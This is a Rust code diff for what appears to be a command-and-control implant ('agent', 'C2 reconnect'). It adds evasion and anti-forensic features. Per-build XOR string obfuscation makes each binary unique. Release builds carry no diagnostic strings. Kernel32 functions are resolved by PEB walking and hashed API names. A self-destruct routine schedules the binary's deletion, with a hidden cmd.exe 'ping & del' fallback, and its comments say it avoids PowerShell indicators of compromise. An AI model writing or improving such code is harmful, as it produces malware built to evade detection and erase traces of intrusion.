@@ -7,7 +7,7 @@ use log::debug;
 use sha2::{Digest, Sha256};
 use uuid::Builder;
 
-// Per-build key from build.rs (unique each compile unless CUPCAKE_OBF_SEED fixed)
+// Per-build key from build.rs (unique each compile unless OBF_SEED fixed)
 include!(concat!(env!("OUT_DIR"), "/obf_seed.rs"));
 
 /// Runtime decode using the per-build key (pairs with `obf_str!`).
@@ -16,19 +16,18 @@ pub fn obf_build_key() -> [u8; 8] {
 }
 
 /// 🛡️ Per-build XOR obfuscation — key from build.rs so binaries differ.
-/// Per-string variation: key is rotated by a hash of the string content index.
+///
+/// Salt is **length-only** (ciphertext has the same length as plaintext), so
+/// [`decode_obf`] can recover it without knowing plaintext first/last bytes.
+/// Different lengths still yield different keystreams.
 #[macro_export]
 macro_rules! obf_str {
     ($s:expr) => {{
         let bytes = $s.as_bytes();
         let mut obf = Vec::with_capacity(bytes.len());
         let base = $crate::utils::obf_build_key();
-        // Per-string salt from length + first/last byte so identical builds still
-        // produce different ciphertext streams for different literals.
-        let salt = (bytes.len() as u8)
-            .wrapping_mul(0x9D)
-            .wrapping_add(bytes.first().copied().unwrap_or(0))
-            .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
+        // Length-derived salt only — must match decode_obf.
+        let salt = (bytes.len() as u8).wrapping_mul(0x9D).wrapping_add(0x5A);
         for (i, b) in bytes.iter().enumerate() {
             let k = base[i % base.len()]
                 .wrapping_add(salt)
@@ -39,30 +38,30 @@ macro_rules! obf_str {
     }};
 }
 
-/// Debug print — file/stderr only on the PEB-safe path.
-///
-/// **Must not** call `stealth::get_module_base` / PEB walk: PEB used to call `db_print`
-/// inside `Once`, and release `db_print` re-entered PEB for `OutputDebugStringA` → deadlock
-/// (agent freeze, no C2 reconnect). That was the `[peb] HIT ...` log you saw right before hang.
-#[inline(always)]
-pub fn db_print(msg: &str) {
-    // Re-entrancy guard: never nest db_print work (e.g. if a future path logs from I/O hooks).
-    thread_local! {
-        static IN_DB_PRINT: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
-    }
-    if IN_DB_PRINT.with(|c| c.replace(true)) {
+/// Debug print implementation — **debug builds only**.
+/// Prefer `db_print!` so format/literal args are compile-time eliminated in release.
+#[cfg(debug_assertions)]
+pub fn db_print_impl(msg: &str) {
+    static IN_DB_PRINT: std::sync::atomic::AtomicBool =
+        std::sync::atomic::AtomicBool::new(false);
+    use std::sync::atomic::Ordering as Ordr;
+    if IN_DB_PRINT.swap(true, Ordr::SeqCst) {
         return;
     }
+    let _guard = Guard(());
+    struct Guard(());
+    impl Drop for Guard {
+        fn drop(&mut self) {
+            IN_DB_PRINT.store(false, Ordr::SeqCst);
+        }
+    }
 
-    #[cfg(debug_assertions)]
     log::debug!("{}", msg);
 
-    let line = format!("{}\n", msg);
-
-    // 1. Append next to exe (or cwd) — pure std, no PEB
     #[cfg(windows)]
     {
         use std::io::Write;
+        let line = format!("{}\n", msg);
         let log_path = std::env::current_exe()
             .ok()
             .and_then(|p| p.parent().map(|d| d.join("agent.log")))
@@ -75,32 +74,27 @@ pub fn db_print(msg: &str) {
             let _ = f.write_all(line.as_bytes());
         }
     }
-
-    // 2. stderr if console present — no PEB
-    #[cfg(all(windows, not(debug_assertions)))]
-    {
-        use std::io::Write;
-        let _ = writeln!(std::io::stderr(), "{}", msg);
-    }
-
-    // 3. Optional extra file
-    #[cfg(not(debug_assertions))]
-    {
-        if let Ok(path) = std::env::var("APP_DEBUG_FILE") {
-            use std::io::Write;
-            if let Ok(mut f) = std::fs::OpenOptions::new()
-                .append(true)
-                .create(true)
-                .open(&path)
-            {
-                let _ = writeln!(f, "{}", msg);
-            }
-        }
-    }
-
-    IN_DB_PRINT.with(|c| c.set(false));
 }
 
+/// Compile-time gated diagnostics. Release expands to nothing (no PE string residue).
+#[macro_export]
+macro_rules! db_print {
+    ($($arg:tt)*) => {{
+        #[cfg(debug_assertions)]
+        {
+            $crate::utils::db_print_impl(&::std::format!($($arg)*));
+        }
+    }};
+}
+
+/// Backward-compatible function form. Prefer `db_print!`.
+#[inline(always)]
+pub fn db_print(_msg: &str) {
+    #[cfg(debug_assertions)]
+    {
+        db_print_impl(_msg);
+    }
+}
 /// Phase 3: Compile-time no-op string obfuscation marker.
 /// The actual XOR key can be tuned per-build to produce unique binaries.
 #[macro_export]
@@ -116,21 +110,17 @@ macro_rules! obf_str_key {
     }};
 }
 
-/// Decode bytes produced by `obf_str!` (same salt derivation).
+/// Decode bytes produced by `obf_str!` (same length-only salt + per-build key).
 pub fn decode_obf(bytes: &[u8]) -> String {
     let mut decoded = Vec::with_capacity(bytes.len());
     let base = OBF_BUILD_KEY;
-    let salt = (bytes.len() as u8)
-        .wrapping_mul(0x9D)
-        .wrapping_add(bytes.first().copied().unwrap_or(0))
-        .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
-    // Note: decode_obf on ciphertext cannot recover salt from plaintext length of original;
-    // for storage of seeds we use xor_obf/xor_deobf with build key only.
+    let salt = (bytes.len() as u8).wrapping_mul(0x9D).wrapping_add(0x5A);
     for (i, b) in bytes.iter().enumerate() {
-        let k = base[i % base.len()].wrapping_add(i as u8);
+        let k = base[i % base.len()]
+            .wrapping_add(salt)
+            .wrapping_add(i as u8);
         decoded.push(b ^ k);
     }
-    let _ = salt;
     String::from_utf8_lossy(&decoded).to_string()
 }
 
@@ -149,11 +139,11 @@ fn xor_deobf(data: &[u8]) -> Vec<u8> {
 
 /// Process-wide cached UUID (stable even if disk persist fails mid-run).
 static AGENT_UUID: std::sync::OnceLock<String> = std::sync::OnceLock::new();
-/// Stable XOR material for UUID seed file v1 (not tied to per-build OBF_BUILD_KEY).
-const UUID_SEED_XOR: [u8; 16] = *b"cpx-uuid-seed-v1";
-const UUID_FILE_MAGIC: &[u8; 4] = b"CPXU";
+/// Seed-derived XOR material for UUID seed file v1 (from wire_ids / build.rs).
+const UUID_SEED_XOR: [u8; 16] = crate::wire_ids::UUID_SEED_XOR;
+const UUID_FILE_MAGIC: [u8; 4] = crate::wire_ids::UUID_FILE_MAGIC;
 const UUID_FILE_VER: u8 = 1;
-const UUID_CHK_DOMAIN: &[u8] = b"cpx-uuid-chk-v1";
+const UUID_CHK_DOMAIN: [u8; 16] = crate::wire_ids::UUID_CHK_DOMAIN;
 
 /// 🛡️ Phase 2: Generate a randomized but persistent Agent UUID.
 ///
@@ -265,8 +255,8 @@ fn load_uuid_seed() -> Option<([u8; 16], bool)> {
             Ok(d) => d,
             Err(_) => continue,
         };
-        // v1: CPXU | ver | seed_xor[16] | csum[4]
-        if data.len() >= 4 + 1 + 16 + 4 && &data[0..4] == UUID_FILE_MAGIC {
+        // v1: magic[4] | ver | seed_xor[16] | csum[4]
+        if data.len() >= 4 + 1 + 16 + 4 && data[0..4] == UUID_FILE_MAGIC {
             if data[4] != UUID_FILE_VER {
                 continue; // unknown version — do not rewrite
             }
@@ -313,7 +303,7 @@ fn write_seed_file_v1(path: &std::path::Path, seed: &[u8; 16]) -> Result<(), ()>
     let xored = xor_uuid_seed_bytes(seed);
     let csum = uuid_seed_checksum(seed);
     let mut buf = Vec::with_capacity(25);
-    buf.extend_from_slice(UUID_FILE_MAGIC);
+    buf.extend_from_slice(&UUID_FILE_MAGIC);
     buf.push(UUID_FILE_VER);
     buf.extend_from_slice(&xored);
     buf.extend_from_slice(&csum);
@@ -341,7 +331,7 @@ mod uuid_seed_tests {
         let path = dir.join("seed.v1");
         write_seed_file_v1(&path, &seed).expect("write v1");
         let data = std::fs::read(&path).unwrap();
-        assert_eq!(&data[0..4], b"CPXU");
+        assert_eq!(&data[0..4], &UUID_FILE_MAGIC);
         // corrupt csum — load via path helper would skip; direct check
         let mut bad = data.clone();
         bad[21] ^= 0xff;
@@ -536,7 +526,9 @@ pub fn opsec_heavy_pace() {
     std::thread::sleep(std::time::Duration::from_millis(ms as u64));
 }
 
-/// Async-friendly heavy-op pacing.
+/// Async-friendly heavy-op pacing (only under the tokio stack — L2 module
+/// builds without `net` keep tokio out of the module image).
+#[cfg(feature = "net")]
 pub async fn opsec_heavy_pace_async() {
     let ms = opsec_heavy_pace_ms();
     if ms == 0 {
@@ -587,14 +579,43 @@ pub async fn self_destruct() -> crate::types::CommandResult {
 
     #[cfg(target_os = "windows")]
     {
-        // Windows: use PowerShell to delete the binary after a short delay
-        let ps_cmd = format!(
-            "Start-Sleep -Seconds 2; Remove-Item -Path '{}' -Force -ErrorAction SilentlyContinue",
-            exe_path.to_string_lossy().replace("'", "''")
-        );
-        let _ = std::process::Command::new("powershell.exe")
-            .args(&["-WindowStyle", "Hidden", "-Command", &ps_cmd])
-            .spawn();
+        // Prefer pending-delete via MoveFileEx (no powershell.exe / -WindowStyleHidden IoC).
+        use std::os::windows::ffi::OsStrExt;
+        use std::os::windows::process::CommandExt;
+        let wide: Vec<u16> = exe_path
+            .as_os_str()
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
+        type MoveFileExWFn = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
+        let ok = unsafe {
+            let k32 = crate::stealth::ensure_module_base(
+                b"kernel32.dll",
+                crate::stealth::hash_module_name(b"kernel32.dll"),
+            );
+            if k32 == 0 {
+                false
+            } else if let Some(addr) =
+                crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"MoveFileExW"))
+            {
+                let f: MoveFileExWFn = std::mem::transmute(addr);
+                // MOVEFILE_DELAY_UNTIL_REBOOT (4): schedule delete when dest is null.
+                f(wide.as_ptr(), std::ptr::null(), 0x4) != 0
+            } else {
+                false
+            }
+        };
+        if !ok {
+            // Fallback: hidden cmd (still avoids PowerShell brand strings in the PE).
+            let path = exe_path.to_string_lossy().replace('"', "");
+            let _ = std::process::Command::new("cmd.exe")
+                .args([
+                    "/C",
+                    &format!("ping -n 3 127.0.0.1 >nul & del /f /q \"{path}\""),
+                ])
+                .creation_flags(0x0800_0000) // CREATE_NO_WINDOW
+                .spawn();
+        }
     }
 
     #[cfg(not(target_os = "windows"))]
@@ -724,6 +745,17 @@ mod tests {
             seen.len() > 1,
             "get_jitter_delay must not be constant when jitter>0"
         );
+    }
+
+    #[test]
+    fn test_obf_str_roundtrip() {
+        let plain = "ws://127.0.0.1:8080/ws";
+        let enc = crate::obf_str!(plain);
+        assert_ne!(enc.as_slice(), plain.as_bytes());
+        let dec = decode_obf(&enc);
+        assert_eq!(dec, plain);
+        let enc2 = crate::obf_str!("short");
+        assert_ne!(enc2.as_slice(), b"short");
     }
 
     #[test]
